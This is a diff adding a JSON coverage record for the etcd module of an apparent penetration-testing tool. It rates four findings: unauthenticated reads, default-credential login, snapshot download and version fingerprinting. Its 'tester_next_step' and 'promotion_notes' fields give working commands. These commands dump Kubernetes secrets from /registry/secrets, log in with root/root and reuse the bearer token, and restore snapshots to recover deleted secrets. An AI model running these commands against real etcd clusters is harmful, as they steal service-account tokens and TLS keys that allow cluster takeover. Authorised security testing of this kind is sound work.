@@ -1,0 +1,57 @@
+{
+  "service": "etcd",
+  "summary": "Well-covered: version fingerprint, v2 keys anon read, v3 kv/range anon read, v3 maintenance/snapshot download (separately gated), and seeded default-cred authenticate against /v3/auth/authenticate (root/root, root/etcd, ...). Snapshot probe is a T2-shaped proof (proves the streaming primitive). Default-cred flow is genuine T3 (bearer token captured). Missing: doesn't actually pull /registry/secrets after obtaining the token (that's the k8s crown-jewel dump).",
+  "module_files": [
+    "/home/kali/Desktop/projects/recce/recce/services/etcd.py"
+  ],
+  "findings": [
+    {
+      "kind": "etcd_unauth_read",
+      "title_pattern": "etcd unauthenticated key-store read",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "v3 kv/range or v2 /v2/keys?recursive returning 200 with kvs/nodes is deterministic proof; secrets not dumped in-module.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Pull /registry/secrets/ --prefix (k8s Secrets), base64-decode, extract SA tokens for cluster impersonation. Also /registry/pods to map workloads.",
+      "promotion_risk": "medium",
+      "tester_next_step": "ETCDCTL_API=3 etcdctl --endpoints http://<ip>:2379 get /registry/secrets/ --prefix -w json | jq -r '.kvs[]|.value|@base64d' > k8s_secrets.dump \u2014 decode SA tokens and TLS."
+    },
+    {
+      "kind": "etcd_default_creds",
+      "title_pattern": "etcd default-credential authentication",
+      "severity": "critical",
+      "tier": "t3",
+      "tier_evidence": "Actual bearer token returned from /v3/auth/authenticate on a seeded credential \u2014 reusable auth material captured.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Chain: use captured token with 'authorization: <token>' header against every etcd RPC (kv/range, maintenance/snapshot, cluster/member/list). Automate the /registry/secrets pull once token in hand.",
+      "promotion_risk": "medium",
+      "tester_next_step": "TOKEN=$(curl -sX POST http://<ip>:2379/v3/auth/authenticate -d '{\"name\":\"root\",\"password\":\"root\"}' | jq -r .token); curl -H \"authorization: $TOKEN\" -X POST http://<ip>:2379/v3/kv/range -d '{\"key\":\"AA==\",\"range_end\":\"AA==\"}'"
+    },
+    {
+      "kind": "etcd_snapshot_download",
+      "title_pattern": "etcd unauthenticated snapshot download",
+      "severity": "critical",
+      "tier": "t2",
+      "tier_evidence": "POST /v3/maintenance/snapshot returning a streamed base64-decoded blob is proof-of-exploit: the module captured actual bbolt bytes (not just a status code).",
+      "can_promote_to": "t3",
+      "promotion_notes": "Complete the download (currently capped at ~200KB) to a real .db file, run etcdctl snapshot restore, walk bbolt to recover DELETED historical Secrets that current kv/range would miss.",
+      "promotion_risk": "low",
+      "tester_next_step": "curl -sk -X POST http://<ip>:2379/v3/maintenance/snapshot -o etcd-snap.db && etcdctl snapshot status etcd-snap.db && etcdctl snapshot restore etcd-snap.db --data-dir /tmp/etcd-restore \u2014 then grep bbolt for historic secrets."
+    },
+    {
+      "kind": "etcd_authed",
+      "title_pattern": "etcd endpoint reachable",
+      "severity": "info",
+      "tier": "t0",
+      "tier_evidence": "Version fingerprint only, no exploit primitive.",
+      "can_promote_to": "t1",
+      "promotion_notes": "The default-cred flow already covers most auth-required cases; could add attempted /v3/auth/user/list with common user names.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl http://<ip>:2379/version \u2014 record version for CVE lookup; try client certs from any looted ~/.etcd/ dir."
+    }
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_creds (SA tokens from /registry/secrets, root/etcd cred pair)",
+    "known_hostkeys (TLS from k8s Secrets in etcd)"
+  ]
+}
